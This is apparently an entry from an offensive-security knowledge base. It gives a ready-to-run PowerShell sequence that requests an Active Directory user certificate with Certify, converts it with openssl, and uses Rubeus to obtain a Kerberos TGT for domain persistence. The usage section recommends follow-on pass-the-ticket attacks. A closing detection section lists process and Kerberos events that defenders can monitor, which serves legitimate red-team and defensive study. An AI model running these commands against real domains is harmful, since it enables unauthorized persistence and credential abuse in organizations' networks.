---
id: e694f20f-db7e-4911-b079-b640b86daabe
name: Certificate-and-TGT-Request-Sequence
type: code
language: ps1
verified: true
created_at: '2023-04-06T03:56:28.361098+00:00'
updated_at: '2023-04-10T20:37:28.987839+00:00'
platforms:
  - Windows
tags:
  - kerberos
  - certificate-abuse
  - persistence
validated: true
---

# Certificate-and-TGT-Request-Sequence

## Code

```ps1
# Request a certificate for the User template
.\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User

# Convert the certificate for Rubeus
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Request a TGT using the certificate
.\Rubeus.exe asktgt /user:username /certificate:C:\Temp\cert.pfx /password:Passw0rd123!
```

## Description

This PowerShell snippet sequences the steps to request a user certificate, convert it to PFX format, and use it to obtain a Kerberos TGT. It automates the persistence technique in Windows domains by chaining certificate enrollment with ticket forging via PKINIT.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| CA01.megacorp.local\CA01 | Certificate Authority server and instance | CA01.domain.local\CA01 |
| User | Certificate template name | User |
| cert.pem | Input PEM certificate file | cert.pem |
| cert.pfx | Output PFX file | cert.pfx |
| username | Target user for TGT | targetuser |
| C:\Temp\cert.pfx | Path to PFX certificate | C:\Temp\cert.pfx |
| Passw0rd123! | PFX export password | StrongPassword! |

## Usage

Execute this snippet on a domain-joined Windows machine with tools in the PATH. It assumes current credentials have enrollment rights. Use the resulting TGT for further domain operations like pass-the-ticket attacks. Run in an elevated PowerShell session to avoid execution restrictions.

## Detection

- Monitor for Certify.exe or Rubeus.exe executions via process auditing (Sysmon Event ID 1).
- Alert on certificate enrollments for 'User' template from unusual hosts/users (CA event logs).
- Kerberos logs (Event ID 4768) showing PKINIT TGT requests; correlate with certificate issuance times.
- Network traffic to CA ports (445/SMB, 88/Kerberos) from compromised endpoints.

## Related

- [[procedures/Request-User-Certificate-and-TGT-for-Domain-Persistence]]
- [[tools/Certify]]
- [[tools/Rubeus]]
